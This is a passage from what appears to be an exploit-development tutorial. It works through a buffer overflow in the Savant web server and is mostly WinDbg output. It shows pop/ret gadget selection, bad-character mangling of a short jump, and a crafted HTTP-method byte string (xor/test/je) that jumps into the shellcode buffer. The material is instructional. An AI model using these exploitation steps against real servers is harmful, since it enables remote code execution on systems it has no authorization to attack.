</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041f</span>e7e  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>db <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">3</span>b df <span style="color:#ae81ff">74</span>  X..e<span style="color:#ae81ff">.3.3</span>..M..;.t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00420</span><span style="color:#ae81ff">904</span>  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> ff <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>f6 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">3</span>b f7 <span style="color:#ae81ff">74</span>  X..e<span style="color:#ae81ff">.3.3</span>..M..;.t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00420</span>a1d  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> f6 <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>ff <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">3</span>b fe <span style="color:#ae81ff">74</span>  X..e<span style="color:#ae81ff">.3.3</span>..M..;.t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00420e69</span>  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> db <span style="color:#ae81ff">89</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>d dc <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">75</span>  X..e<span style="color:#ae81ff">.3</span>..]..M...u
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00420</span>ed8  <span style="color:#ae81ff">58</span> c3 <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">65</span> e8 <span style="color:#ae81ff">33</span> db <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span>ff <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">4</span>d fc ff <span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">75</span> e0  X..e<span style="color:#ae81ff">.3.3</span>..M...u.
</span></span></code></pre></div><p>The first one is a good candidate. Replacing such address with the EIP overwrite leads us in landing to such address. Let&rsquo;s analyze it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> bp <span style="color:#ae81ff">0x418674</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> Savant.exe
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0000000</span>e edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77732</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000202</span>
</span></span><span style="display:flex;"><span>Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18674</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0000000</span>e edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77732</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000202</span>
</span></span><span style="display:flex;"><span>Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18674</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0481f</span>e60 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0000000</span>e edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77732</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">016</span>d2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8675</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea20 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000202</span>
</span></span><span style="display:flex;"><span>Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18675</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8675</span> c3              ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea20  <span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea74
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea24  <span style="color:#ae81ff">0041703</span>c Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1703c</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds <span style="color:#a6e22e">poi</span>(esp)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea74  <span style="color:#ae81ff">00544547</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea78  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea7c  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea80  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea84  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea88  <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea8c  <span style="color:#ae81ff">4141412f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea90  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea94  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">81</span>ea98  <span style="color:#ae81ff">41414141</span>
</span></span></code></pre></div><p>We can see that now we are landing on the address that we want.
Because we made sure that EAX would contain a valid memory address, we should be able to execute these instructions without generating an access violation, until we reach our buffer of 0x41 characters.
While this solution works, executing assembly instructions generated by the opcodes of our HTTP method <strong>is not very clean.</strong> Let’s explore some other options in the hopes of finding a more elegant way of reaching the start of our 0x41 buffer.</p>
<p>First, let&rsquo;s think that we are sending the GET method in our request, as well as the route, and such values are the ones being interpreted when the pop, ret instruction occurs.
What if we change the HTTP method used and insert some bytes? If instruction bytes can be inserted, when performing the jump, it would jump to our controlled instruction. We could insert a short jump instruction instead of GET in order to jump directly to our payload.
Let&rsquo;s try to modify the method used and insert some &ldquo;C&rdquo; characters as the method. They get reflected:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18674</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0041</span><span style="color:#ae81ff">8674</span> <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dc <span style="color:#a6e22e">poi</span>(esp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea74  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>  CCCCCCCC........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea84  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">4141412f</span> <span style="color:#ae81ff">41414141</span>  ........<span style="color:#f92672">/</span>AAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea94  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eaa4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eab4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eac4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ead4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eae4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>Now, we want to replace our &ldquo;C&quot;s for a short jump instruction. Let&rsquo;s see how much bytes do we have to jump:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> db <span style="color:#a6e22e">poi</span>(esp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea74  <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  CCCCCCCC........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea84  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  ........<span style="color:#f92672">/</span>AAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea94  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eaa4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eab4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eac4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ead4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>eae4  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>Now let&rsquo;s put a breakpoint on TBD and perform the short jump operation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> a eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea74 jmp <span style="color:#ae81ff">0x0478ea8d</span> 
</span></span><span style="display:flex;"><span>jmp <span style="color:#ae81ff">0x0478ea8d</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea76 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> u eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea74 eb17            jmp     <span style="color:#ae81ff">047</span><span style="color:#ae81ff">8</span>ea8d
</span></span></code></pre></div><p>We would have to add eb17 as the HTTP method.
However, when inserting it, we see that the &ldquo;eb&rdquo; bytes are replaced for &ldquo;cb&rdquo;, meaning that such character has been mangled:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0475</span>ea74 cb              retf
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0475</span>ea75 <span style="color:#ae81ff">17</span>              pop     ss
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0475</span>ea76 <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0475</span>ea78 <span style="color:#ae81ff">0000</span>            add     byte ptr [eax],al
</span></span></code></pre></div><p>Given that this memory is most likely allocated separately from the allocation storing the rest of the buffer, <strong>it is possible that different operations are done that cause our byte to get mangled.</strong> Therefore, take note as you might find different memory allocations with different checks and operations performed on the data stored in them, and you have to find a different set of bad characters for such section.
For now, let&rsquo;s assume that we can&rsquo;t use a short jump operation.
We need another solution. We could maybe use the island hopping technique, modifying the ESP to point to our buffer and jump to it.
However, we are going to see other alternative. Let&rsquo;s see <strong>conditional jumps.</strong>
Conditional jumps are a jump operation that only is executed is specific conditions are done. This process occurs in two steps.
The first step is a test on the condition, and the second step is a jump depending on the condition.
Note: There are a number of conditional jumps in the assembly language that depend on registry values, FLAG registers, and comparisons between signed or unsigned operands.
While we do have a limited memory space that is allocated for the HTTP method, it should still be more than enough for us to set up a condition followed by a jump for that condition.
<strong>We will use the JE (Jump if Equal) condition. This instruction will execute a short jump and the condition from the jump is based on the value of the ZF (Zero Flag) register. More specifically, the jump is taken if the value of the ZF register is 1 (TRUE).</strong>
Note: The Zero Flag register is a single bit flag that is used on most architectures. On x86/x64, it is stored in a dedicated register called ZF. This flag is used to check the result of arithmetic operations. It is set to 1 (TRUE) if the result of an arithmetic operation is zero and otherwise set to 0 (FALSE).</p>
<p>In order to jump, we need to set the value of the ZF to 1 so that the condition is true.
To archieve that, we will use a XOR operation between a register as destination and as source. Any register is valid, as long as the instruction does not contain badchars. <strong>Doing a XOR with the same destination and source sets the register to 0, nulling the register</strong>.
After the XOR, we will do a TEST instruction with the same register as both operands. As the result is 0, the ZF results to be 1.
Then we can perform the JE o JZ (they both check if ZF is set to 1).
Let&rsquo;s craft these operations (we will use ECX as the dummy register for the XOR and TEST operations):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> xor ecx, ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">31</span>C9              xor ecx,ecx
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> test ecx, ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">85</span>C9              test ecx,ecx
</span></span><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> je <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">0F</span><span style="color:#ae81ff">8411000000</span>      jz near <span style="color:#ae81ff">0x17</span>
</span></span></code></pre></div><p>The last instruction contains three null bytes. This is problematic but remember that the rest of the space between the HTTP method and the slash and our payload is full of zeros. We can skip from sending these null bytes as they will be already stored in such place by the application:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>httpMethod <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xC9\x85\xC9\x0F\x84\x11</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; /&#34;</span>  <span style="color:#75715e"># xor ecx, ecx; test ecx, ecx; je 0x17</span>
</span></span></code></pre></div><p>If we send this and analyze the code, now the instructions are not mangled and that it is a clean jump to our shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea74 <span style="color:#ae81ff">31</span>c9            xor     ecx,ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea76 <span style="color:#ae81ff">85</span>c9            test    ecx,ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea78 <span style="color:#ae81ff">0f</span><span style="color:#ae81ff">8411000000</span>    je      <span style="color:#ae81ff">046</span>bea8f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">046</span>bea8f
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea8f <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea90 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea91 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea92 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea93 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea94 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">046</span>bea95 <span style="color:#ae81ff">41</span>              inc     ecx
</span></span></code></pre></div><p>Let&rsquo;s see the ZF value after the XOR and TEST operations:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> r zf
</span></span><span style="display:flex;"><span>zf<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
